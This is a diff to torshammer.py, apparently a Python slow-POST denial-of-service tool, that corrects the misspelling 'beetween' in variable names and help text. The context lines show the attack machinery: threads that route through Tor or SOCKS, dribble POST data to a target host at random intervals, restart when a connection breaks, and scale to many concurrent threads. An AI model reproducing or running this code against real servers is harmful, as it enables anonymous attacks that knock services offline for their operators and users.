@@ -26,8 +26,8 @@ stop_now = False
 global term
 term = terminal.TerminalController()
 
-global presleepbeetweenthreadstart
-presleepbeetweenthreadstart = None
+global presleepbetweenthreadstart
+presleepbetweenthreadstart = None
 
 
 useragents = [
@@ -339,7 +339,7 @@ useragents = [
 
 
 class httpPost(Thread):
-    def __init__(self, threadid, host, port, tor, sockshost, socksport, maxsecondsbeetweenpacket):
+    def __init__(self, threadid, host, port, tor, sockshost, socksport, maxsecondsbetweenpacket):
         Thread.__init__(self)
         self.threadid = threadid
         self.host = host
@@ -348,7 +348,7 @@ class httpPost(Thread):
         self.tor = tor
         self.sockshost = sockshost
         self.socksport = socksport
-        self.maxsecondsbeetweenpacket = maxsecondsbeetweenpacket
+        self.maxsecondsbetweenpacket = maxsecondsbetweenpacket
         self.running = True
         self.sentcount = 0
 
@@ -374,7 +374,7 @@ class httpPost(Thread):
             print(term.BOL+term.UP+term.CLEAR_EOL+"[%d]: Posting: %s" % (self.threadid, p+term.NORMAL))
             self.socks.send(p)
             self.sentcount += 1
-            time.sleep(random.uniform(0.1, maxsecondsbeetweenpacket))
+            time.sleep(random.uniform(0.1, maxsecondsbetweenpacket))
 
         # self.socks.close()
 
@@ -403,7 +403,7 @@ class httpPost(Thread):
                 try:
                     self._send_http_post()
                 except Exception as e:
-                    sleeptime = random.uniform(0.1, presleepbeetweenthreadstart or 2.0)
+                    sleeptime = random.uniform(0.1, presleepbetweenthreadstart or 2.0)
 
                     if e.args[0] == 32 or e.args[0] == 104:
                         # print(term.BOL + term.UP + term.CLEAR_EOL + "Thread broken, restarting..." + term.NORMAL)
@@ -424,7 +424,7 @@ def usage():
     print(" -S|--sockshost <SOCKS host addrees> eg: 127.0.0.1")
     print(" -P|--socksport <SOCSS host port> Defaults to 1080")
     print(" -i|--max-delay <max seconds beetwen packets in float> Defaults to 3.0")
-    print(" -s|--pre-sleep-on-thread-start <max seconds beetween starting threads> Default to none")
+    print(" -s|--pre-sleep-on-thread-start <max seconds between starting threads> Default to none")
     print(" -h|--help Shows this help\n")
     print("Eg. ./torshammer.py -t 192.168.1.100 -r 256\n")
 
@@ -443,7 +443,7 @@ def main(argv):
     port = 80
     sockshost = False
     socksport = 1080
-    maxsecondsbeetweenpacket = 3
+    maxsecondsbetweenpacket = 3
 
     for o, a in opts:
         if o in ("-h", "--help"):
@@ -462,9 +462,9 @@ def main(argv):
         elif o in ("-P", "--socksport"):
             socksport = int(a)
         elif o in ("-i", "--max-delay"):
-            maxsecondsbeetweenpacket = float(a)
+            maxsecondsbetweenpacket = float(a)
         elif o in ("-s", "--pre-sleep-on-thread-start"):
-            presleepbeetweenthreadstart = float(a)
+            presleepbetweenthreadstart = float(a)
 
     if target == '' or int(threads) <= 0:
         usage()
@@ -481,11 +481,11 @@ def main(argv):
 
     rthreads = []
     for i in range(threads):
-        t = httpPost(i, target, port, tor, sockshost, socksport, maxsecondsbeetweenpacket)
+        t = httpPost(i, target, port, tor, sockshost, socksport, maxsecondsbetweenpacket)
         rthreads.append(t)
         t.start()
-        if presleepbeetweenthreadstart:
-            time.sleep(random.uniform(0.1, presleepbeetweenthreadstart))
+        if presleepbetweenthreadstart:
+            time.sleep(random.uniform(0.1, presleepbetweenthreadstart))
 
     while len(rthreads) > 0:
         try:
